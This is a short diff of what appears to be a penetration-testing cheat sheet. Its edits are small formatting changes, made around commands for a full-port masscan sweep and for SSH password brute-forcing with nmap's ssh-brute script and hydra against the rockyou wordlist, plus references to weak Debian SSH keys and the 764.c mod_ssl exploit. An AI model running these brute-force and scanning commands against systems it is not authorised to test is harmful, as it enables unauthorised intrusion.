@@ -33,12 +33,10 @@ masscan -p0-65535 10.x.x.x --rate 150000 -oL output.txt <br />
 - **SSH(22)** <br />
 Bruteforce : <br />
 ```sh
-nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 10.x.x.x<br />
+nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 10.x.x.x 
 hydra -l user -P /usr/share/wordlists/rockyou.txt  10.x.x.x ssh -t 4
 ```
-ref : <br />
-https://github.com/g0tmi1k/debian-ssh 
-https://blog.g0tmi1k.com/2010/04/pwnos/
+ref : https://github.com/g0tmi1k/debian-ssh  && https://blog.g0tmi1k.com/2010/04/pwnos/ <br />
 OpenF*** (Apache mod_ssl < 2.8.7 OpenSSL) 764.c <br />
 
 
